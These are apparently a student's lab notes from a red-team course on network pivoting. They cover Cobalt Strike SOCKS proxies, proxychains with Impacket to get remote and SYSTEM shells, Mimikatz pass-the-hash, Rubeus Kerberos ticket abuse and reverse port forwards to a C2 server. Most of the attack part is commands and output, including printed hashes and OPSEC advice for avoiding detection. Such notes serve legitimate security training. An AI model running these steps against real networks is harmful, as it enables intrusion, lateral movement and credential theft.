---
description: 09/30/2025
---

# Pivoting

## SOCKS Proxies

A <mark style="color:yellow;">**SOCKS**</mark> (short for _<mark style="color:yellow;">**Socket Secure**</mark>_) <mark style="color:yellow;">**Proxy**</mark> exchanges network packets between a client and a server.

A common implementation of a proxy is found in _**web proxies**_. _<mark style="color:$success;">**This is where a browser will connect to the proxy**</mark>_, _<mark style="color:$success;">**which relays requests to the destination website and returns back to the browser**</mark>_ (performing filtering etc. along the way).&#x20;

#### Offensive Uses

As a result, <mark style="color:green;">we can use this technology as an offensive application by turning our C2 server into a SOCKS proxy to tunnel external tooling into an internal network</mark>.&#x20;

### Use Cases

This is particularly useful when we want to leverage toolsets like [<mark style="color:yellow;">`Impacket`</mark>](https://github.com/SecureAuthCorp/impacket).  <mark style="color:$danger;">Windows doesn't have a native capability to execute Python</mark>, <mark style="color:$success;">so being able to execute them on our own system and tunnel the traffic through Beacon can expand our arsenal of available tooling</mark>. &#x20;

#### OPSEC Advantages

_<mark style="color:$success;">**Since we are not pushing offensive tooling onto the target or even executing any code on a compromised endpoint, we can massively shrink out footprint for detection**</mark>_!

### SOCKS Proxies in Cobalt Strike

Cobalt Strike has both a **SOCKS4a** and **SOCKS5** proxy.&#x20;

The main difference between them is that _**only**_**&#x20;SOCKS5** supports authentication and has some additional logging capabilities.

#### Usage

Use the <mark style="color:yellow;">`socks`</mark> command on the Beacon that you want to act as the pivot point.

**To start a SOCKS4a proxy, simply run:**

```
beacon> socks 1080
```

**To start a SOCKS5 proxy, run:**

```
beacon> socks 1080 socks5 disableNoAuth myUser myPassword enableLogging
```

{% hint style="info" %}
The <mark style="color:yellow;">`enableLogging`</mark> option sends additional logs (such as authentication failures) to the VM console, which you unfortunately can't see easily when the team server running as a service.
{% endhint %}

**Instead, we can use `journalctl`:**

```
ubuntu teamserver[687]: [*] SOCKS5 (18): ********** Constructing Socks5Command **********
ubuntu teamserver[687]: [*] SOCKS5 (18): Greeting: NoAuth Authentication offered: 0
ubuntu teamserver[687]: [*] SOCKS5 (18): Greeting: UserPwd Authentication offered: 2
ubuntu teamserver[687]: [*] SOCKS5 (18): sendChosenAuthentication: Chosen Authentication Type: 2
ubuntu teamserver[687]: [*] SOCKS5 (18): verifyUserPwd: Verifying User/Password Authentication
ubuntu teamserver[687]: [*] SOCKS5 (18): verifyUserPwd: Verifying user:
ubuntu teamserver[687]: [-] SOCKS5 (18): Invalid login attempt from user:
ubuntu teamserver[687]: [-] SOCKS (18): Socks Error
```

**You will now see port `1080` bound on the team server VM:**

```
attacker@ubuntu ~> sudo ss -lpnt
State    Recv-Q   Send-Q     Local Address:Port        Peer Address:Port   Process
LISTEN   0        128                    *:1080                   *:*       users:(("TeamServerImage",pid=687,fd=13))
```

{% hint style="danger" %}
**OPSEC**\
\
Since this is bound on all interfaces, any device that has network access to the team server VM may, in theory, interact with the SOCKS traffic. &#x20;

Even though this should not be the case, the use of SOCKS5 gives an additional layer of protection.
{% endhint %}

<mark style="color:$success;">So, use the</mark> <mark style="color:$success;"></mark><mark style="color:$success;">**SOCKS5**</mark> <mark style="color:$success;"></mark><mark style="color:$success;">proxy, lol.</mark>

The speed at which data is transferred over the proxy is determined by the sleep time of the Beacon that executed the <mark style="color:yellow;">`socks`</mark> command. &#x20;

To set the Beacon to an interactive state, use <mark style="color:yellow;">`sleep 0`</mark>.  In most cases, this is a quality of life vs stealth trade-off. &#x20;

The more frequently your Beacon talks to the team server, the louder it appears on the wire. However, some tools may timeout and fail with longer sleep times so it's up to you to find a balance.

## Linux Tools

<mark style="color:yellow;">`proxychains`</mark> is a tool which acts as a wrapper around other applications to tunnel their traffic over a **SOCKS** proxy.&#x20;

**First, we need to modify its configuration file to point to our Cobalt Strike SOCKS proxy server:**

```
attacker@DESKTOP-3BSK7NO ~> sudo vim /etc/proxychains.conf
```

At the bottom of the file, you will see a default entry for SOCKS4:  <mark style="color:yellow;">`socks4 127.0.0.1 9050`</mark>. &#x20;

**We need to change this to match the settings of the proxy we started in Beacon:**

* <mark style="color:$success;">**SOCKS4**</mark>:  <mark style="color:yellow;">`socks4 127.0.0.1 1080`</mark>

OR

* <mark style="color:$success;">SOCKS5</mark>:  <mark style="color:yellow;">`socks5 127.0.0.1 1080 myUser myPassword`</mark>

**To tunnel a tool through&#x20;**<mark style="color:yellow;">**`proxychains`**</mark>**, it's as simple as&#x20;**<mark style="color:yellow;">**`proxychains [tool] [tool args]`**</mark>**.  So to tunnel&#x20;**<mark style="color:yellow;">**`wmiexec`**</mark>**, it would be:**

```
ubuntu@DESKTOP-3BSK7NO ~ > proxychains wmiexec.py DEV/jking@10.10.122.30
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:445-<><>-OK
[*] SMBv3.0 dialect used
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:135-<><>-OK
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:49667-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
dev\jking

C:\>hostname
web
```

## Windows Tools

We can also _<mark style="color:$success;">**tunnel traffic from our Windows machine**</mark>_ using a software utility called [<mark style="color:yellow;">`Proxifier`</mark>](https://www.proxifier.com/).&#x20;

**To create a new proxy entry, go to Profile > Proxy Servers.  Click Add and enter the relevant details:**

<figure><img src="../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

When asked if you want to use this proxy by default, select **NO**.

Select **YES** when prompted to go to the **Proxification Rules**.

Here, you will tell Proxifier which applications to proxy and under what conditions.

Click **Add** to create a new rule and use the following:

* **Name:** `Tools`
* **Applications**:  `Any`
* **Target** **hosts**:  `10.10.120.0/24;10.10.122.0/23`
* **Target** **ports**:  `Any`
* **Action**:  `Proxy SOCKS5 10.10.5.50`

<figure><img src="../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

To enable authentication to occur over the proxy, an application needs to be launched as a user from the target domain. This can be achieved via `runas /netonly` or on Mimikatz.

Let's use Active Directory Users and Computers (ADUC) as an example here:

The file responsible for launching ADUC is <mark style="color:yellow;">`dsa.msc`</mark>, which is actually just a snap-in for <mark style="color:yellow;">`mmc.exe`</mark>.&#x20;

**Open a Command Prompt window as a local admin, then launch&#x20;**<mark style="color:yellow;">**`mmc.exe`**</mark>**&#x20;via&#x20;**<mark style="color:yellow;">**`runas`**</mark>**:**

```
PS C:\Users\Attacker> runas /netonly /user:DEV\bfarmer mmc.exe
Enter the password for DEV\bfarmer:
Attempting to start mmc.exe as user "DEV\bfarmer" ...
```

#### How-to

Go to **File > Add/Remove Snap-in** (or Ctrl + M for short), add the ADUC snap-in, then click OK. &#x20;

Right-click on the snap-in, select **Change Domain**, enter <mark style="color:yellow;">`dev.cyberbotic.io`</mark> and click OK. &#x20;

You will see `Proxifier` begin to capture and relay traffic and ADUC loads the content. &#x20;

You may continue to drill down into the users and computers etc.

<figure><img src="../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

**To achieve the same with Mimikatz:**

```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
```

**PowerShell cmdlets that support credential objects can also be used:**

```
PS C:\Users\Attacker> $cred = Get-Credential
PS C:\Users\Attacker> Get-ADComputer -Server 10.10.122.10 -Filter * -Credential $cred | select DNSHostName

DNSHostName
-----------
dc-2.dev.cyberbotic.io
fs.dev.cyberbotic.io
wkstn-2.dev.cyberbotic.io
web.dev.cyberbotic.io
sql-2.dev.cyberbotic.io
wkstn-1.dev.cyberbotic.io
```

## Pivoting with Kerberos

In the previous examples, we leveraged both plaintext credentials (with <mark style="color:yellow;">`Impacket`</mark> and <mark style="color:yellow;">`runas /netonly`</mark>) and NTLM (with Mimikatz) to authenticate to resources over the **SOCKS** proxy.

However, it is possible to use Kerberos tickets as well.

Using <mark style="color:yellow;">`Impacket`</mark> through <mark style="color:yellow;">`proxychains`</mark> is a popular way to do so.

**First, let's use&#x20;**<mark style="color:yellow;">**`getTGT.py`**</mark>**&#x20;to request a TGT for&#x20;**<mark style="color:yellow;">**`jking`**</mark>**&#x20;with their AES-256 hash:**

```
ubuntu@DESKTOP-3BSK7NO ~> proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
[*] Saving ticket in jking.ccache
```

{% hint style="info" %}
Be sure to use the fully qualified domain name, `dev.cyberbotic.io`, rather than the `NetBIOS` name, `DEV`.
{% endhint %}

This will automatically output the ticket in `ccache` format which can be used with other Impacket scripts. &#x20;

However, we must first create an environment variable called <mark style="color:green;">`KRB5CCNAME`</mark> that will point to the `ccache` file.

```
ubuntu@DESKTOP-3BSK7NO ~> export KRB5CCNAME=jking.ccache
```

**Now we can use&#x20;**<mark style="color:yellow;">**`psexec.py`**</mark>**&#x20;to get a SYSTEM shell on `WEB`:**

```
ubuntu@DESKTOP-3BSK7NO ~> proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:445-<><>-OK
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
[*] Requesting shares on 10.10.122.30.....
[*] Found writable share ADMIN$
[*] Uploading file rzBHyscR.exe
[*] Opening SVCManager on 10.10.122.30.....
[*] Creating service msin on 10.10.122.30.....
[*] Starting service msin.....
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:445-<><>-OK
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:445-<><>-OK
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
[!] Press help for extra shell commands
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:445-<><>-OK
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
Microsoft Windows [Version 10.0.20348.887]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname && whoami
web
nt authority\system

C:\Windows\system32> exit
[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on 10.10.122.30.....
[*] Stopping service msin.....
[*] Removing service msin.....
[*] Removing file rzBHyscR.exe.....
```

### Dealing with Tickets in Kirbi Format

If you have a ticket in `kirbi` format obtained with another tool, it can be converted to `ccache` format for use with `Impacket`. &#x20;

**For example, here I'm using the TGT delegation trick to get a usable TGT for `bfarmer` from a non-elevated session:**

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap

[*] Action: Request Fake Delegation TGT (current user)
[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dc-2.dev.cyberbotic.io'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: QPQjXYnE0c8tkwjNuTFxaNArevF+TosSgYJ/kQcrShw=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

doIFzj[...snip...]MuSU8=
```

**Base64 decode the ticket and write it to&#x20;**<mark style="color:yellow;">**`bfarmer.kirbi`**</mark>**:**

```
ubuntu@DESKTOP-3BSK7NO ~> echo -en 'doIFzj[...snip...]MuSU8=' | base64 -d > bfarmer.kirbi
```

**Then convert it using&#x20;**<mark style="color:yellow;">**`ticketConverter.py`**</mark>**:**

```
ubuntu@DESKTOP-3BSK7NO ~> ticketConverter.py bfarmer.kirbi bfarmer.ccache
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
```

{% hint style="info" %}
You can also use `ticketConverter.py` to convert from `ccache` to `kirbi`.
{% endhint %}

### Using a TGT to Interact w/ a SQL-2 Service

**Now let's use this TGT to interact with the `SQL-2` service:**

```
ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -dc-ip 10.10.122.10 -no-pass -k dev.cyberbotic.io/bfarmer@sql-2.dev.cyberbotic.io
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.25:1433-<><>-OK
[*] Encryption required, switching to TLS
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-2): Line 1: Changed database context to 'master'.
[*] INFO(SQL-2): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands

SQL> select @@servername;

--------------------------------------------------------------------------------------------------------------------------------

SQL-2
```

**This may require adding a static host entry to&#x20;**<mark style="color:yellow;">**`/etc/hosts`**</mark>**&#x20;and changing the&#x20;**<mark style="color:yellow;">**`proxy_dns`**</mark>**&#x20;setting in&#x20;**<mark style="color:yellow;">**`/etc/proxychains.conf`**</mark>**&#x20;to&#x20;**<mark style="color:yellow;">**`remote_dns`**</mark>**:**

Kerberos tickets can also be leveraged from the Windows attacker machine.  The first step is to add `*.cyberbotic.io` your `Proxifier` proxification rule(s). &#x20;

This is because Kerberos uses hostnames rather than IP addresses and `Proxifier` won't proxy Kerberos traffic unless the domains are explicitly set in the rules.

<figure><img src="../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

**Next, launch an instance of `cmd.exe` or `powershell.exe` using `runas /netonly` with a valid domain username, but a fake password:**

```
PS C:\Users\Attacker> runas /netonly /user:dev.cyberbotic.io\bfarmer powershell.exe
Enter the password for dev.cyberbotic.io\bfarmer: FakePass
Attempting to start powershell.exe as user "dev.cyberbotic.io\bfarmer" ...
```

**The spawned process will have no Kerberos tickets in its cache:**

```
PS C:\Windows\system32> klist

Current LogonId is 0:0x260072

Cached Tickets: (0)
```

This method of pivoting prefers the presence of the correct service ticket(s) up front, rather than relying on a single TGT in the cache. &#x20;

**If we want to access the&#x20;**<mark style="color:yellow;">**`SQL-2`**</mark>**&#x20;service through&#x20;**<mark style="color:yellow;">**`HeidiSQL`**</mark>**&#x20;then we need a service ticket for the `MSSQLSvc` service:**

```
PS C:\Windows\system32> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:doIFzj[...snip...]MuSU8= /service:MSSQLSvc/sql-2.dev.cyberbotic.io:1433 /dc:dc-2.dev.cyberbotic.io /ptt

[*] Action: Ask TGS
[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'MSSQLSvc/sql-2.dev.cyberbotic.io:1433'
[*] Using domain controller: dc-2.dev.cyberbotic.io (127.95.0.2)
[+] TGS request successful!
[+] Ticket successfully imported!

PS C:\Windows\system32> klist

Current LogonId is 0:0x260072

Cached Tickets: (1)

#0>     Client: bfarmer @ DEV.CYBERBOTIC.IO
        Server: MSSQLSvc/sql-2.dev.cyberbotic.io:1433 @ DEV.CYBERBOTIC.IO
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 10/11/2023 14:23:52 (local)
        End Time:   10/11/2023 19:22:58 (local)
        Renew Time: 10/18/2023 9:22:58 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

**Launch `HeidiSQL` from the same powershell window:**

```
PS C:\Windows\system32> C:\Tools\HeidiSQL\heidisql.exe
```

**Set the target hostname to&#x20;**<mark style="color:yellow;">**`sql-2.dev.cyberbotic.io`**</mark>**&#x20;and connect:**

![](https://files.cdn.thinkific.com/file_uploads/584845/images/607/fd7/b78/heidi.png)

## Browsers

Firefox plus the _**FoxyProxy**_ extension is ideal for pivoting a browser into the network, to view internal web applications.  Simply add a new entry in _**FoxyProxy**_ that points to the Beacon **SOCKS** proxy.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/3e5/73f/7fd/foxy-proxy.png)

**Then navigate to the internal web server, `10.10.122.30`:**

![](https://files.cdn.thinkific.com/file_uploads/584845/images/797/345/0f5/iis.png)

You can also perform NTLM authentication following the steps outlined in [this post](https://offensivedefence.co.uk/posts/ntlm-auth-firefox/).

## Reverse Port Forwards

Reverse Port Forwarding allows a machine to redirect inbound traffic on a specific port to another IP and port.

### Use Cases

A useful implementation of this allows machines to bypass firewall and other network segmentation restrictions, to talk to nodes they wouldn't normally be able to.&#x20;

**For example, we can use the console of&#x20;**_**Domain Controller 2**_**&#x20;to demonstrate that it&#x20;**_**does not**_**&#x20;have outbound access to our team server:**

```
PS C:\Users\Administrator> hostname
dc-2

PS C:\Users\Administrator> iwr -Uri http://nickelviper.com/a
iwr : Unable to connect to the remote server
```

**We know of course that Workstation 2 does - so we can create a reverse port forward to relay traffic between Domain Controller 2 and our team server**:

```
beacon> rportfwd 8080 127.0.0.1 80
[+] started reverse port forward on 8080 to 127.0.0.1:80
```

This will bind port `8080` on Workstation 2.

```
beacon> run netstat -anp tcp
TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
```

Any traffic hitting this port will be tunnelled back to the team server over the C2 channel. &#x20;

**The team server will then relay the traffic to the forward host/port, then send the response back over Beacon.  Now, we can download the file via this port forward:**

```
PS C:\Users\Administrator> iwr -Uri http://wkstn-2:8080/a

StatusCode        : 200
```

{% hint style="danger" %}
**OPSEC**\
\
When the Windows firewall is enabled, it will prompt the user with an alert when an application attempts to listen on a port that is not explicitly allowed. &#x20;

Allowing access requires local admin privileges and clicking cancel will create an explicit block rule.\
\
![](https://files.cdn.thinkific.com/file_uploads/584845/images/9f7/2d7/24e/alert.png)
{% endhint %}

**You must therefore create an allow rule before running a reverse port forward using either&#x20;**<mark style="color:yellow;">**`netsh`**</mark>**&#x20;or&#x20;**<mark style="color:yellow;">**`New-NetFirewallRule`**</mark>**, as adding and removing rules does not create a visible alert:**

```
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```

Don't be lazy by disabling the firewall entirely.

**You can delete a firewall rule later by its&#x20;**<mark style="color:yellow;">**`DisplayName`**</mark>**:**

```
beacon> powershell Remove-NetFirewallRule -DisplayName "8080-In"
```
